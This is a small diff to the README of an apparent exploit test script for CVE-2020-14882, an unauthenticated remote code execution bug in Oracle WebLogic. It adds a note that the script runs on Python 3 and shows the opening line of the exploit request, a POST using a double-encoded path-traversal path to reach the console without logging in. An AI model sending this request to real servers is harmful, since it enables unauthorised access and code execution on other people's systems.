@@ -1,6 +1,6 @@
 # (CVE-2020–14882) Weblogic Unauthorized bypass RCE
 (CVE-2020-14882) Oracle Weblogic Unauthorized bypass RCE test script
-
+it works on Python3 
 # Requests
 
     POST /console/images/%252E%252E%252Fconsole.portal HTTP/1.1
